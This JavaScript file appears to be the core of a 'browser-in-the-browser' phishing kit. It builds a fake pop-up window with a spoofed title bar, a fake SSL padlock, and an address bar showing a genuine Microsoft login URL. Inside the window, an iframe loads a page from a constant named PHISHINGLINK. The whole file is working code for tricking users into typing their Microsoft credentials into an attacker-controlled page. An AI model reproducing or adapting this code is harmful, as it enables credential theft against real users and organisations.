const loadTITLE = "Log in";
const TITLE = "Sign in to your account";
const loadDOMAINNAME = "";
const DOMAINNAME = "https://login.microsoftonline.com";
const DOMAINNAMEVERIFY = "login.microsoftonline.com";
const loadDOMAINPATH = "about:blank";
const DOMAINPATH = "/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=633eb5b3-96f2-6069-cf8f-21fb1819535d&response_mode=fragment&client_info=1&prompt=select_account&nonce=019a8e84-34a3-7f6e-ad1e-48a80de25b6d&state=eyJpZCI6IjAxOWE4ZTg0LTM0YTMtN2QxZS1iM2RlLTRiYmY3YTA3NjQ1OSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8_ZGVlcGxpbms9bWFpbCUyRjAlMkYlM0ZubHAlM0Qw&claims=%7B%3A%5BCP1%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=4.14.0&response_type=code&code_challenge=SaYANLlDuzCEuwfc5yU3F0znEiaT4VpgpkFoGuA_XHQ&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob,flname,wld";
const PHISHINGLINK = "localhost/microsoft";
const loadLOGO = "store/loading2.gif";
const LOGO = "store/microsoft.svg";
const loadTIME = 1000;

var minimize = document.getElementById("minimize");
var square = document.getElementById("square");
var exit = document.getElementById("exit");
var titleBar = document.getElementById("title-bar");

////////////////// Hover listeners //////////////////
minimize.addEventListener('mouseover', function handleMouseOver() {
  minimize.style.backgroundColor = '#272727';
  minimize.style.cursor = 'context-menu';
});

minimize.addEventListener('mouseout', function handleMouseOut() {
  minimize.style.backgroundColor = 'black';
  minimize.style.cursor = 'default';
});

square.addEventListener('mouseover', function handleMouseOver() {
  square.style.backgroundColor = '#272727';
  square.style.cursor = 'context-menu';
});

square.addEventListener('mouseout', function handleMouseOut() {
  square.style.backgroundColor = 'black';
  square.style.cursor = 'default';
});

exit.addEventListener('mouseover', function handleMouseOver() {
  exit.style.backgroundColor = 'red';
  exit.style.cursor = 'context-menu';
});

exit.addEventListener('mouseout', function handleMouseOut() {
  exit.style.backgroundColor = 'black';
  exit.style.cursor = 'default';
});

titleBar.addEventListener('mouseover', function handleMouseOver() {
  titleBar.style.cursor = 'context-menu';
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});


//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:
var draggable = $('#window');
var title = $('#title-bar');

title.on('mousedown', function (e) {
  var dr = $(draggable).addClass("drag");
  height = dr.outerHeight();
  width = dr.outerWidth();
  ypos = dr.offset().top + height - e.pageY,
    xpos = dr.offset().left + width - e.pageX;
  $(document.body).on('mousemove', function (e) {
    var itop = e.pageY + ypos - height;
    var ileft = e.pageX + xpos - width;
    if (dr.hasClass("drag")) {
      dr.offset({ top: itop, left: ileft });
    }
  }).on('mouseup', function (e) {
    dr.removeClass("drag");
  });
});

////////////////// Onclick listeners //////////////////
// X button functionality
$("#exit").click(function () {
  $("#window").hide();
  $("#ssl-certificate").hide();
  init();
  $("#content").css("visibility", "hidden");
});

// Maximize button functionality
$("#square").click(enlarge);

function enlarge() {
  if (square.classList.contains("enlarged")) {
    $("#window").css("width", "40%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#square").removeClass("enlarged");
  }
  else {
    $("#window").css("width", "70%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#square").addClass("enlarged");
  }
}

////////////////// Init objective //////////////////

init();
$("#content").attr("src", PHISHINGLINK);
$("#domain-name-verify").text(DOMAINNAMEVERIFY);

$("#clickme").click(function () {
  $("#window").show();
  setTimeout(loaded, loadTIME);
});

function loaded() {
  $("#logo-description").text(TITLE);
  $("#domain-name").text(DOMAINNAME);
  $("#domain-path").text(DOMAINPATH);
  $("#logo").attr("src", LOGO);
  $("#content").css("visibility", "visible");
}

function init(){
  $("#logo-description").text(loadTITLE);
  $("#domain-name").text(loadDOMAINNAME);
  $("#domain-path").text(loadDOMAINPATH);
  $("#logo").attr("src", loadLOGO);
}

// SSL check functionality

$("#ssl-padlock").click(function () {
  $("#ssl-certificate").toggle();
});

$(".ssl-close").click(function () {
  $("#ssl-certificate").hide();
});
